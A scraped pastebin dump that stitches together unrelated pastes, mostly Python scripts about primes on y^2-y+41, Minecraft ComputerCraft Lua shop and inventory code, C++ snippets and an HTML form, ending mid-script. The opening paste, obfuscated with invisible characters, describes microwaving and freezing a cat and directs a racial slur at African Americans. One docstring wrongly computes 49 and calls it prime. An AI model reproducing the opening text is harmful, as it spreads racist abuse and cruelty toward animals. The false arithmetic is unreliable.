P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎I‎v‎a‎r‎ ‎L‎e‎i‎d‎u‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎y‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎t‎'‎s‎ ‎m‎e‎.‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎p‎u‎t‎ ‎y‎o‎u‎r‎ ‎c‎a‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎i‎c‎r‎o‎w‎a‎v‎e‎ ‎f‎o‎r‎ ‎3‎ ‎s‎e‎c‎o‎n‎d‎s‎.‎ ‎T‎h‎e‎n‎ ‎t‎a‎k‎e‎ ‎h‎e‎r‎ ‎o‎u‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎p‎u‎t‎ ‎y‎o‎u‎r‎ ‎c‎a‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎r‎e‎e‎z‎e‎r‎.‎ ‎T‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎p‎e‎t‎ ‎y‎o‎u‎r‎ ‎d‎o‎g‎.‎ ‎R‎e‎a‎l‎l‎y‎ ‎h‎a‎r‎d‎.‎ ‎J‎u‎s‎t‎ ‎k‎e‎e‎p‎ ‎p‎e‎t‎t‎i‎n‎g‎ ‎y‎o‎u‎r‎ ‎d‎o‎g‎ ‎o‎v‎e‎r‎ ‎a‎n‎d‎ ‎o‎v‎e‎r‎ ‎a‎g‎a‎i‎n‎.‎ ‎T‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎s‎a‎y‎ ‎s‎o‎m‎e‎ ‎h‎u‎r‎t‎f‎u‎l‎ ‎t‎h‎i‎n‎g‎s‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎.‎ ‎I‎ ‎w‎i‎l‎l‎ ‎t‎e‎l‎l‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎r‎e‎t‎u‎r‎n‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎ ‎c‎o‎u‎n‎t‎r‎i‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎.‎"
C3e7q9e8,palindromic_primes_finder,Python253,Python,Sunday 10th of March 2024 10:14:39 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: primes_finder_plus.py
# Author: Jeoi Reqi

""""""
Primes Finder +Plus+:

This Python script identifies prime & palindromic prime numbers generated using the equation [P = y^2 - y + 41], where 'y' is a starting value provided by the user.
The script iterates through a sequence of numbers, checks if each corresponds to a prime and subsequently palindromic primes, and displays the results to the terminal.

**Requirements:**
- Python 3

**Usage:**
1. Run the script in a terminal or command prompt.
2. Enter the starting value for 'y'.
3. Specify the number of iterations to check.
4. The script will output primes & palindromic prime numbers along with their corresponding 'y' values.

**Note:**
- The equation used is [P = y^2 - y + 41].
- Prime numbers that are also palindromes will be highlighted in the output.

Example:
Enter the starting value for y: 41
Enter the number of iterations: 10

Results:
[y=43, P=1847*]
[y=44, P=1933*]
[y=46, P=2111*]
[y=47, P=2203*]
[y=48, P=2297*]
[y=49, P=2393*]
""""""

def is_prime(num):
    """"""
    Checks if a given number is prime.

    Args:
        num (int): The number to check for primality.

    Returns:
        bool: True if the number is prime, False otherwise.
    """"""
    if num < 2:
        return False
    for i in range(2, int(num**0.5) + 1):
        if num % i == 0:
            return False
    return True

def is_palindrome(num):
    """"""
    Checks if a given number is a palindrome.

    Args:
        num (int): The number to check for palindrome.

    Returns:
        bool: True if the number is a palindrome, False otherwise.
    """"""
    return str(num) == str(num)[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    """"""
    Generates and identifies prime and palindromic prime numbers.

    Args:
        start_y (int): The starting value for 'y'.
        iterations (int): The number of iterations to check.

    Returns:
        list: A list of formatted strings representing the results.
    """"""
    results = []
    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""\033[31m[y={y}, pP={P}**]\033[0m"")
        elif is_prime(P):
            results.append(f""[y={y}, P={P}*]"")
        elif is_palindrome(P):
            results.append(f""\033[33m[y={y}, p={P}]\033[0m"")

    return results

def main():
    """"""
    Main function to execute the script.
    Takes user input for 'y' and iterations, then outputs the results to the terminal.
    """"""
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    data = generate_primes_and_palindromes(start_y, iterations)

    print(""\nResults:"")
    for result in data:
        print(result)

if __name__ == ""__main__"":
    main()

"
fEkDKTFu,primes_finder_plus,Python253,Python,Sunday 10th of March 2024 10:13:24 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: primes_finder_plus.py
# Author: Jeoi Reqi

""""""
Primes Finder +Plus+:

This Python script identifies prime & palindromic prime numbers generated using the equation [P = y^2 - y + 41], where 'y' is a starting value provided by the user.
The script iterates through a sequence of numbers, checks if each corresponds to a prime and subsequently palindromic primes, and displays the results to the terminal.

**Requirements:**
- Python 3

**Usage:**
1. Run the script in a terminal or command prompt.
2. Enter the starting value for 'y'.
3. Specify the number of iterations to check.
4. The script will output primes & palindromic prime numbers along with their corresponding 'y' values.

**Note:**
- The equation used is [P = y^2 - y + 41].
- Prime numbers that are also palindromes will be highlighted in the output.
""""""

def is_prime(num):
    """"""
    Checks if a given number is prime.

    Args:
        num (int): The number to check for primality.

    Returns:
        bool: True if the number is prime, False otherwise.
    """"""
    if num < 2:
        return False
    for i in range(2, int(num**0.5) + 1):
        if num % i == 0:
            return False
    return True

def is_palindrome(num):
    """"""
    Checks if a given number is a palindrome.

    Args:
        num (int): The number to check for palindrome.

    Returns:
        bool: True if the number is a palindrome, False otherwise.
    """"""
    return str(num) == str(num)[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    """"""
    Generates and identifies prime and palindromic prime numbers.

    Args:
        start_y (int): The starting value for 'y'.
        iterations (int): The number of iterations to check.

    Returns:
        list: A list of formatted strings representing the results.
    """"""
    results = []
    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""\033[31m[y={y}, pP={P}**]\033[0m"")
        elif is_prime(P):
            results.append(f""[y={y}, P={P}*]"")
        elif is_palindrome(P):
            results.append(f""\033[33m[y={y}, p={P}]\033[0m"")

    return results

def main():
    """"""
    Main function to execute the script.
    Takes user input for 'y' and iterations, then outputs the results to the terminal.
    """"""
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    data = generate_primes_and_palindromes(start_y, iterations)

    print(""\nResults:"")
    for result in data:
        print(result)

if __name__ == ""__main__"":
    main()

"
4awc5nkM,inspect.lua - Main Turtle Inspect Program,HeyItzGeo,Lua,Sunday 10th of March 2024 10:03:54 PM CDT,"--Updated
local Item = peripheral.wrap(""front"")
local turtleID = os.getComputerID()


-- Set the shared location for update status
local updateStatusPath = ""disk/Updater/Files/update_status.txt""

-- Set the Pastebin code for your program
local pastebinCode = ""4awc5nkM""

-- Set the local path where you want to save the program
local localPath = ""startup""


-- Function to download content from Pastebin
function downloadFromPastebin(code)
    local url = ""https://pastebin.com/raw/"" .. code
    local response = http.get(url)
    
    if response then
        local content = response.readAll()
        response.close()
        return content
    else
        print(""Failed to download from Pastebin"")
        return nil
    end
end

-- Function to update the startup program
function updateStartup()
    if fs.exists(localPath) then
        fs.delete(localPath)
    end

    local content = downloadFromPastebin(pastebinCode)
    if content then
        local file = fs.open(localPath, ""w"")
        if file then
            file.write(content)
            file.close()
            print(""Startup program updated."")
        else
            print(""Failed to open file for writing: "" .. localPath)
        end
    else
        print(""Failed to update startup program."")
    end
end

-- Function to check for updates and update the program if needed
function checkForUpdates()
    if fs.exists(updateStatusPath) then
        local statusFile = fs.open(updateStatusPath, ""r"")
        if statusFile then
            local status = statusFile.readAll()
            statusFile.close()

            if status == ""update"" then
                updateStartup()

                -- Clear the status file after updating
                fs.delete(updateStatusPath)

                -- Terminate the current program to allow the new one to take effect
                os.queueEvent(""terminate"")
            end
        else
            print(""Failed to open update status file."")
        end
    end
end




-- Function to get item details
local function getItemDetails()
    local itemDetails = Item.getItemDetail(1)
    if itemDetails then
        return itemDetails.displayName, itemDetails.name
    end
    return nil, nil
end





-- Function to check if a file exists
local function fileExists(path)
    return fs.exists(path) and not fs.isDir(path)
end
-- Function to check if ""cost.txt"" is formatted correctly
local function checkCostFile()
    local costPath = ""cost.txt""
    if not fileExists(costPath) then
        print(""Error: Missing 'cost.txt'. Please create and format the file."")
        return false
    end
    local costFile = fs.open(costPath, ""r"")
    local countLine = costFile.readLine()
    local priceLine = costFile.readLine()
    costFile.close()
    if not countLine or not priceLine or not countLine:match(""Count = (%d+)"") or not priceLine:match(""Price = (%d+)"") then
        print(""Error: Incorrect format in 'cost.txt'. Please ensure it contains 'Count = <number>' and 'Price = <number>'."")
        return false
    end
    return true
end
-- Function to check if an item is in front
local function checkItemInFront()
    local DisplayName, ItemName = getItemDetails()
    if not DisplayName or not ItemName then
        print(""Error: No item detected in front. Please place an item in front of the turtle."")
        return false
    end
    return true
end
-- Main initialization
if not checkCostFile() or not checkItemInFront() then
    -- Handle initialization errors and exit the program if necessary
    return
end

-- Function to load the balance data from ShopBal.txt
local function loadBalances()
    local path = ""disk/ShopBal.txt""
    local file = fs.open(path, ""r"")
    if file then
        local content = file.readAll()
        file.close()
        local success, balances = pcall(textutils.unserialize, content)
        if success and type(balances) == ""table"" then
            return balances
        else
            print(""Error: Unable to unserialize balance data from "" .. path)
            print(""Error Message: "" .. tostring(balances))
        end
    else
        print(""Error: Unable to open file "" .. path)
    end
    return {}
end
-- Function to save the updated balances to ShopBal.txt
local function saveBalances(balances)
    local path = ""disk/ShopBal.txt""
    local file = fs.open(path, ""w"")
    if file then
        file.write(textutils.serialize(balances))
        file.close()
    else
        print(""Error: Unable to open file "" .. path)
    end
end
-- Function to save player items to a file with counts
local function savePlayerItems(username, displayName, itemName, count)
    local folderPath = ""disk/Players/""
    local filePath = folderPath .. username
    local file
    -- Create the folder if it doesn't exist
    if not fs.isDir(folderPath) then
        fs.makeDir(folderPath)
    end
    -- Open the file in append mode
    if fs.exists(filePath) then
        file = fs.open(filePath, ""r"")
        local content = file.readAll()
        file.close()
        -- Parse existing content to update item counts
        local playerItems = {}
        for line in content:gmatch(""[^\r\n]+"") do
            local itemDisplayName, itemNameExisting, existingCount = line:match(""([^,]+),([^,]+),(%d+)"")
            if itemDisplayName and itemNameExisting and existingCount then
                existingCount = tonumber(existingCount)
                playerItems[itemDisplayName .. "","" .. itemNameExisting] = existingCount
            end
        end
        -- If the item doesn't exist in the file, add a new line
        if not playerItems[displayName .. "","" .. itemName] then
            playerItems[displayName .. "","" .. itemName] = 0
        end
        -- Update the count based on the specified count
        playerItems[displayName .. "","" .. itemName] = playerItems[displayName .. "","" .. itemName] + count
        file = fs.open(filePath, ""w"")
        for key, value in pairs(playerItems) do
            file.writeLine(key .. "","" .. value)
        end
        file.close()
    else
        -- Open the file in write mode with count for the first occurrence
        file = fs.open(filePath, ""w"")
        if file then
            file.writeLine(displayName .. "","" .. itemName .. "","" .. count)
            file.close()
        else
            print(""Error: Unable to open file "" .. filePath)
        end
    end
end
-- Function to handle successful money transaction
local function Money_Success(username, cost, balances)
    print(""Transaction successful for "" .. username .. "". Cost: "" .. cost)
    balances[username] = balances[username] - cost
    saveBalances(balances)
    local DisplayName, ItemName = getItemDetails()
    -- Assuming 'cost.txt' contains individual count and price lines
    local costPath = ""cost.txt""
    local costFile = fs.open(costPath, ""r"")
    if costFile then
        local countLine = costFile.readLine()
        local priceLine = costFile.readLine()
        local count = tonumber(countLine:match(""Count = (%d+)""))
        local price = tonumber(priceLine:match(""Price = (%d+)""))
        if count and price then
            local cost = price  -- Cost per item, not total cost
            savePlayerItems(username, DisplayName, ItemName, count)  -- Pass the count as the fourth parameter
        else
            print(""Error: Unable to read count and price from "" .. costPath)
        end
        costFile.close()
    else
        print(""Error: Unable to open file "" .. costPath)
    end
    -- Add your code for a successful transaction here
end
-- Function to handle failed money transaction
local function Money_Fail(username, cost, currentBalance)
    print(""Transaction failed for "" .. username .. "". Insufficient funds. Cost: "" .. cost)
    print(""Current Balance for "" .. username .. "": "" .. currentBalance)
    -- Add your code for a failed transaction here
end
-- Function to compare the balance and perform actions accordingly
local function checkBalance(username, cost)
    local balances = loadBalances()
    if balances[username] then
        local playerBalance = balances[username]
        if playerBalance >= cost then
            Money_Success(username, cost, balances)
        else
            Money_Fail(username, cost, playerBalance)
        end
    else
        Money_Fail(username, cost, 0)  -- Assuming initial balance is 0
    end
end
-- Function to update the global database
local function updateGlobalDatabase(DisplayName, Price, Count, TurtleID)
    local path = ""disk/GlobalDatabase.txt""
    local file
    -- Extract the item name without the ""minecraft:"" prefix
    local itemName = DisplayName:gsub(""minecraft:"", """")
    if fs.exists(path) then
        file = fs.open(path, ""r"")
        local content = file.readAll()
        file.close()
        -- Parse existing content to find and update the line for the current TurtleID
        local lines = {}
        local foundTurtleID = false
        for line in content:gmatch(""[^\r\n]+"") do
            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")
            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then
                if tonumber(turtleIDExisting) == TurtleID then
                    foundTurtleID = true
                    line = itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID
                end
                table.insert(lines, line)
            end
        end
        -- If the TurtleID was not found, append a new line
        if not foundTurtleID then
            table.insert(lines, itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)
        end
        file = fs.open(path, ""w"")
        for _, line in ipairs(lines) do
            file.writeLine(line)
        end
        file.close()
    else
        -- Create the file and add a new line for the current TurtleID
        file = fs.open(path, ""w"")
        if file then
            file.writeLine(itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)
            file.close()
        else
            print(""Error: Unable to open file "" .. path)
        end
    end
end
-- Function to update cost.txt with values associated with TurtleID
local function updateCostFile(TurtleID)
    local turtleCostsPath = ""cost.txt""
    local globalDatabasePath = ""disk/GlobalDatabase.txt""
    local file
    local foundTurtleID = false
    local count, price
    -- Check if TurtleID is in globaldatabase.txt
    if fs.exists(globalDatabasePath) then
        file = fs.open(globalDatabasePath, ""r"")
        local content = file.readAll()
        file.close()
        -- Check if TurtleID entry exists in globaldatabase.txt
        if content:match(TurtleID) then
            -- Extract values for the TurtleID from globaldatabase.txt
            local itemName, priceExisting, countExisting = content:match(""([^|]+)|([^|]+)|([^|]+)|"" .. TurtleID)
            if itemName and priceExisting and countExisting then
                foundTurtleID = true
                price = tonumber(priceExisting)
                count = tonumber(countExisting)
            end
        end
    else
        print(""Error: Unable to open file "" .. globalDatabasePath)
        return
    end
    -- Set values in cost.txt based on globaldatabase.txt
    if foundTurtleID then
        file = fs.open(turtleCostsPath, ""w"")
        file.writeLine(""Count = "" .. count)
        file.writeLine(""Price = "" .. price)
        file.close()
       --#IGNORE print(""Updated cost.txt with values from GlobalDatabase.txt for TurtleID "" .. TurtleID)
    else
        -- Add a new entry for the TurtleID with values from cost.txt to globaldatabase.txt
        if fs.exists(turtleCostsPath) then
            file = fs.open(turtleCostsPath, ""r"")
            local countLine = file.readLine()
            local priceLine = file.readLine()
            file.close()
            local itemName = DisplayName  -- Use the actual item display name
			if itemName then
				print(""Item Name Found"")
			else
				print(""Error: itemName is nil. Unable to update globalDatabase.txt."")
				-- Add any additional handling or error reporting as needed
			end
            file = fs.open(globalDatabasePath, ""a"")
			local formattedItemName = getItemDetails() or ItemName:gsub(""minecraft:"", """")
			file.writeLine(formattedItemName .. ""|"" .. priceLine:gsub(""Price = "", """") .. ""|"" .. countLine:gsub(""Count = "", """") .. ""|"" .. TurtleID)
            --file.writeLine(itemName .. ""|"" .. priceLine:gsub(""Price = "", """") .. ""|"" .. countLine:gsub(""Count = "", """") .. ""|"" .. TurtleID)
            file.close()
            print(""Added new entry for TurtleID "" .. TurtleID .. "" in GlobalDatabase.txt with values from cost.txt"")
        else
            print(""Error: Unable to open file "" .. turtleCostsPath)
        end
    end
end
-- Main loop to constantly check for player clicks
local prevItemName = nil  -- Variable to store the previous item name
while true do
	
	-- Check for inactivity and restart if needed
    event, username, device = os.pullEvent(""playerClick"")
	checkForUpdates()
    -- Get item details when a player clicks
    local DisplayName, ItemName = getItemDetails()
    -- Check if item details are available
    if DisplayName and ItemName then
		print(""DisplayName: "" .. DisplayName)
		print(""ItemName: "" .. ItemName)
        local TurtleID = os.getComputerID()
        -- Update cost.txt with values associated with the TurtleID
        updateCostFile(TurtleID)
        -- Check if the item in front has changed
        if prevItemName ~= ItemName then
            prevItemName = ItemName
            -- Assuming 'cost.txt' contains individual count and price lines
            local costPath = ""cost.txt""
            local costFile = fs.open(costPath, ""r"")
            if costFile then
                local countLine = costFile.readLine()
                local priceLine = costFile.readLine()
                if countLine and priceLine then
                    local count = tonumber(countLine:match(""Count = (%d+)""))
                    local price = tonumber(priceLine:match(""Price = (%d+)""))
                    if count and price then
                        local cost = price  -- Cost per item, not total cost
                        checkBalance(username, cost)
                        -- Remove ""minecraft:"" from ItemName
                        local formattedItemName = ItemName:gsub(""minecraft:"", """")
                        -- Update the item name in globalDatabase.txt
                        local globalDatabasePath = ""disk/GlobalDatabase.txt""
                        local globalFile = fs.open(globalDatabasePath, ""r"")
                        local globalContent = globalFile.readAll()
                        globalFile.close()
                        local lines = {}
                        for line in globalContent:gmatch(""[^\r\n]+"") do
                            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")
                            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then
                                if tonumber(turtleIDExisting) == TurtleID then
                                    -- Update the item name
                                    line = formattedItemName .. ""|"" .. priceExisting .. ""|"" .. countExisting .. ""|"" .. turtleIDExisting
                                end
                            end
                            table.insert(lines, line)
                        end
                        globalFile = fs.open(globalDatabasePath, ""w"")
                        for _, line in ipairs(lines) do
                            globalFile.writeLine(line)
                        end
                        globalFile.close()
                        -- Add any additional code specific to your application
                    else
                        print(""Error: Unable to read count and price from "" .. costPath)
                    end
                else
                    print(""Error: Missing lines in "" .. costPath)
                end
                costFile.close()
                -- Reset prevItemName to nil after a successful transaction
                prevItemName = nil
            else
                print(""Error: Unable to open file "" .. costPath)
            end
        else
            print(""Item in front has not changed. Skipping update."")
        end
    end
end"
h34Uemxn,Untitled,ShRooK_MoHameD,C++,Sunday 10th of March 2024 10:01:00 PM CDT,"void solve(){

   ll n , x ; cin >> n >> x;
   vector < ll > v(n); cin(v);
   map < ll , vector <int>> mp;
   for (int i = 0; i < n; i++)
   {
      mp[v[i]].push_back(i + 1);
   }
   
   sort(all(v));

   for (int i = 0; i < n - 3; i++)
   {
       
       for (int j = i + 1 ; j < n - 2; j++)
       {
            int l = j + 1 , r = n-1; 
    
            while (r > l) 
            { 
                if ( v[i] + v[j] + v[l] + v[r] == x) 
                { 
                    cout << mp[v[i]].back() << "" "" ; mp[v[i]].pop_back();
                    cout << mp[v[j]].back() << "" "" ; mp[v[j]].pop_back();
                    cout <<  mp[v[l]].back() << "" ""; mp[v[l]].pop_back();
                    cout <<  mp[v[r]].back(); 
                    return;
                } 
            
                if (v[i] + v[j] + v[l] + v[r] > x) 
                    r--; 
                else  
                    l++; 
            } 
       }
       
   }
   
   cout << ""IMPOSSIBLE"";
   
}"
4ADsAdAf,preset,CustomRL,C++,Sunday 10th of March 2024 09:56:13 PM CDT,"auto itemWrapper = gameWrapper->GetItemsWrapper();
auto presetLoadout = gameWrapper->GetUserLoadoutSave().GetPresets();
// auto loopAmount = presetLoadout.Count();
auto loopAmount = 1;

if (!itemWrapper) return;

for (size_t i = 0; i < loopAmount; i++) {
	auto preset = presetLoadout.Get(i);
	auto loadout = gameWrapper->GetUserLoadoutSave().GetEquippedLoadout().GetLoadoutData().blue.GetOnlineLoadoutV2(); // temp for just testing current preset

	for (const auto& itemID : loadout) {
		ItemsWrapper item = gameWrapper->GetItemsWrapper(); 
		if (item.IsNull()) continue;

		auto product = item.GetProduct(itemID.lower_bits);

		if (!product.IsNull()) {
			auto quality = product.GetDisplayLabelSlot().ToString();
			cvarManager->log(""\nLong Label: "" + product.GetLongLabel().ToString() + ""\nQuality: "" + quality);
		}
	}
}"
9RWygwzz,Untitled,lgrocks11,Lua,Sunday 10th of March 2024 09:54:06 PM CDT,"--Variables

local Connected_Inventories = {}
local Inventory = {}
local Slot_Count = 16

--Functions

local function readInventory(InventoryIndex,InventoryID)
	--make a list of every item,its count,and slot number.
	local ItemInfo_List = {}
	for i = 1,Slot_Count do
		local ItemInfo = turtle.getItemDetail(i)
		if ItemInfo then
			local Item_Info = {ItemInfo[1],ItemInfo[2],i}
			table.insert(ItemInfo_List,Item_Info)
		end
	end
	return ItemInfo_List
end

local function addItemToInvList(ItemInfos)
	--Add item and count to the general Inventory list.
	table.insert(Inventory,ItemInfos)
end

local function moveInfo(Inventory_List)
	for Item_Index,Item_Information in pairs(Inventory_List) do
		addItemToInvList(Item_Information)
	end
end

local function takeInventory()
	for Inventory_Index,Inventory_ID in pairs(Connected_Inventories) do
		local InvList = readInventory(Inventory_Index,Inventory_ID)
		--for every item in the readInventory lists, add its name and its count to the general Inventory list.
		moveInfo(InvList)
	end
	return Inventory
end

local function printInventory()
	takeInventory()
	print(""Inventory: "")
	for ItemIndex,ItemInformation in pairs(Inventory) do
		print(ItemInformation[1].."";""..ItemInformation[2])
	end
end

--Program starts

for Peripheral_Index,Peripheral_ID in pairs(peripheral.getNames()) do
	local Current_Peripheral = peripheral.wrap(Peripheral_ID)
	local Peripheral_Name,Peripheral_Type = peripheral.getType(Current_Peripheral)
	if Peripheral_Type == ""inventory"" then
		table.insert(Connected_Inventories,Current_Peripheral)
	end
end

printInventory()"
ELGQtBfK,Untitled,lgrocks11,Lua,Sunday 10th of March 2024 09:50:06 PM CDT,"--Variables

local Connected_Inventories = {}
local Inventory = {}
local Slot_Count = 16

--Functions

local function readInventory(InventoryIndex,InventoryID)
	--make a list of every item,its count,and slot number.
	local ItemInfo_List = {}
	for i = 1,Slot_Count do
		local ItemInfo = turtle.getItemDetail(i)
		if ItemInfo then
			local Item_Info = {ItemInfo[1],ItemInfo[2],i}
			table.insert(ItemInfo_List,Item_Info)
		end
	end
	return ItemInfo_List
end

local function addItemToInvList(ItemInfos)
	--Add item and count to the general Inventory list.
	table.insert(Inventory,ItemInfos)
end

local function moveInfo(Inventory_List)
	for Item_Index,Item_Information in pairs(Inventory_List) do
		addItemToInvList(Item_Information)
	end
end

local function takeInventory()
	for Inventory_Index,Inventory_ID in pairs(Connected_Inventories) do
		local InvList = readInventory(Inventory_Index,Inventory_ID)
		--for every item in the readInventory lists, add its name and its count to the general Inventory list.
		moveInfo(InvList)
	end
	return Inventory
end

local function printInventory()
	takeInventory()
	for ItemIndex,ItemInformation in pairs(Inventory) do
		print(ItemInformation[1].."";""..ItemInformation[2])
	end
end

--Program starts

for Peripheral_Index,Peripheral_ID in pairs(peripheral.getNames()) do
	local Current_Peripheral = peripheral.wrap(Peripheral_ID)
	local Peripheral_Name,Peripheral_Type = peripheral.getType(Current_Peripheral)
	if Peripheral_Type == ""inventory"" then
		table.insert(Connected_Inventories,Current_Peripheral)
	end
end

printInventory()"
w2UgEkNb,Ticket 15367488 - custom HTML block,longnguyenwp,HTML,Sunday 10th of March 2024 09:42:03 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
<meta charset=""UTF-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<title>Domain Search.</title>
<style>
    /* Container for the form to center align it */
    .form-container {
        text-align: center;
        margin-top: 20px;

    }

    /* Style for the form */
    form {
        display: inline-block; /* Align input and button in a line */
        background-color: transparent; /* No background for the form */
        border: none; /* No border for the form */
    }

    /* Style for the input field */
    input[type=""text""] {
        height: 44px; /* Height of input field */
        width: 300px; /* Adjust this value to change the length */
        padding: 0 10px; /* Padding inside the input field */
        border: 2px solid #F0C05A; /* Specified border color */
        background-color: black; /* Background color for the input field */
        color: white; /* Text color inside the input field */
        border-right: none; /* Remove right border to connect with the button */
        border-radius: 22px 0 0 22px; /* Rounded corners on the left side */
    }

    /* Style for the submit button */
    input[type=""submit""] {
        height: 44px; /* Slightly larger to cover the border of the input field */
        border: 2px solid #F0C05A; /* Specified border color */
        background-color: #F0C05A; /* Background color for the button */
        color: black; /* Text color for the button */
        padding: 0 15px; /* Padding inside the button */
        border-radius: 0 22px 22px 0; /* Rounded corners on the right side */
        cursor: pointer; /* Change cursor to pointer to indicate clickable item */
        border-left: none; /* Remove left border to eliminate gap with the input field */
        font-size: 18px; /* Adjust this value to change the font size */
        font-weight: bold; /* Make the text bold */
    }

    /* Hover effect for button */
    input[type=""submit""]:hover {
        background-color: #DAA520; /* Darker shade on hover for better user interaction */
        border-color: #DAA520; /* Match border color with the background on hover */
    }

    /* Style for placeholder to ensure it's white */
    input[type=""text""]::placeholder {
        color: white;
        font-size: 18px; /* Adjust this value to change the font size */
        font-weight: bold; /* Make the text bold */
    }

</style>
</head>
<body>

<div class=""form-container"">
    <form action=""https://shop.cybermerlin.com/cart.php?a=add&domain=register"" method=""post"">
        <input type=""text"" name=""query"" placeholder="" Find your new domain name"" />
        <input type=""submit"" value=""Check"" />
    </form>
</div>

</body>
</html>"
EgRGwNGQ,ulam_py2y41,Python253,Python,Sunday 10th of March 2024 09:23:39 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: ulam_py2y41.py
# Version: 2.0.1
# Author: Jeoi Reqi

""""""
Ulam Spiral Visualizer Of Primes & Palindromic Primes On The Golden Line:

This Python script generates a spiral visualization of primes and palindromic primes.
The Ulam Spiral is a spiral arrangement of natural numbers, where the numbers are plotted on a grid & primes are highlighted.
In this script, the golden line is traced by the equation [P = y^2 - y + 41], where 'y' is the starting value determined by the user.
The golden line represents a diagonal line crossing the center where 'y' is.
Primes (indicated by red dots) & Palindromic Primes (indicated by blue dots) are distinctly marked, with some Primes being Palindromic Primes.

Requirements:
- Python 3
- Matplotlib

Usage:
- Run the script in a terminal or command prompt.
- Enter the starting value for 'y', which determines the plot's central starting point value.
- Enter the number of iterations of 'y' to be visualized in the spiral grid.
- The script will generate a plot and save it as a PNG file (e.g., 'y41_i100.png').
- The terminal output will be saved in a dynamically named text file (e.g., 'output_y41_i100.txt').

Note:
- The golden line is traced by the equation [P = y^2 - y + 41].
- Close the plot window to terminate the script.

Equation:   P=y^2-y+41
 
 Definition:
        Must be TRUE:
            [P] is a Prime 
            [P] is possibly a Palindrome
            [y] is a natural whole integer
            [y] is a positive number
      !!    [y] is not less than 2  (y>2)        
        (Note: P = Prime Pattern Breaks if y>2)
        
        
        Example: (if y = 4) Find P:
            
            [P = y^2-y+41]

            4^2-4+41 = P
            4x4-4+37 = P
            16-4 +37 = P
            12 + 37 = 49
 
            Prime Value is equal to (4 squared minus 4 plus 41) 
            P = 49 (Prime)
""""""

# Imports
import matplotlib.pyplot as plt
import time
import sys
import os

# Create an empty list to capture terminal output
terminal_output = []

plt.style.use('dark_background')
plt.ion()

# checks if a given number is prime or not
def is_prime(num):
    if num < 2:
        return False
    for i in range(2, int(num**0.5) + 1):
        if num % i == 0:
            return False
    return True

# change the x/y coordinates based on the state
def march(state, x, y):
    if state == 0:
        x += 1
    if state == 1:
        y += 1
    if state == 2:
        x -= 1
    if state == 3:
        y -= 1

    return x, y

# Create a list to capture the terminal output
terminal_output = []

# Ask the user for the starting number
y_value = int(input(""Enter the starting number (y): ""))

while y_value < 2:
    # If the user enters a starting number less than 2, prompt them to enter a valid one
    print(""Please enter a starting number greater than or equal to 2."")
    y_value = int(input(""Enter the starting number (y): ""))

# Ask the user for the number of iterations
iterations_number = int(input(""Enter the number of iterations (i): ""))

# Initialize variables for the previous coordinates
l_x = 1
l_y = 0

# Initialize current coordinates based on user input
x = 0
y = y_value  # Use the user's input as the starting number

# Initialize variables for the Ulam Spiral algorithm
state = -1
factor = -1
steps = 1
current_steps = 0

# Record the start time for performance measurement
start_time = time.time()

# Create a list to store plot data
plot_data = []

# Create a dynamic filename for the plot
plot_filename = f""y{y_value}_i{iterations_number}.png""

# Create a single plot
fig, ax = plt.subplots()

# Loop through the range of iterations to generate points for the Ulam Spiral
for i in range(y_value, y_value + iterations_number):
    # Store the current coordinates as the previous coordinates
    l_x = x
    l_y = y

    # Increment the steps taken in the current direction
    current_steps += 1

    # Check if the current steps have reached the predefined number of steps
    if current_steps >= steps:
        # Increase the factor to change the direction of movement
        factor += 1
        current_steps = 0

        # Move to the next coordinates based on the Ulam Spiral algorithm
        x, y = march(state, x, y)

        # Increase the state to change the direction of movement
        state += 1

        # Reset the state to 0 if it exceeds 3 (four directions in total)
        if state > 3:
            state = 0

        # Change the factor after every two steps
        if factor == 2:
            factor = 0
            steps += 1

    # If the current steps are not 0, move to the next coordinates
    if current_steps != 0:
        x, y = march(state, x, y)

    # Define the two points to be plotted
    point1 = [x, y]
    point2 = [l_x, l_y]

    # Define the x and y values for plotting
    x_values = [point1[0], point2[0]]
